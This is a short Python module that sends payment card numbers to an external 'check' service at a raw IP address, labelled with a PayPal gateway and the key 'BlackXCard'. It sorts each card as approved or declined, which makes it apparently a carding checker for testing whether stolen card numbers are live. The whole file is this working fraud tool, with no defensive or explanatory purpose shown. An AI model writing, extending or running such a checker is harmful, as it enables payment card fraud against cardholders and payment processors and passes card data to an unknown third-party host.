import aiohttp
import json
import asyncio

PP_API_URL = "http://103.131.128.254:8084/check?gateway=PayPal&key=BlackXCard&cc="

async def check_pp_card(card: str) -> dict:
    """Check single PayPal card using external API"""
    try:
        url = PP_API_URL + card
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=30) as response:
                text = await response.text()
                
                try:
                    data = json.loads(text)
                    status = data.get("status", "").upper()
                    response_msg = data.get("response", "No response")
                    
                    is_approved = status == "APPROVED" or "approved" in response_msg.lower()
                    
                    return {
                        "status": "approved" if is_approved else "declined",
                        "message": response_msg,
                        "api_status": status
                    }
                except json.JSONDecodeError:
                    return {"status": "error", "message": "Invalid API response"}
                
    except asyncio.TimeoutError:
        return {"status": "error", "message": "Timeout"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

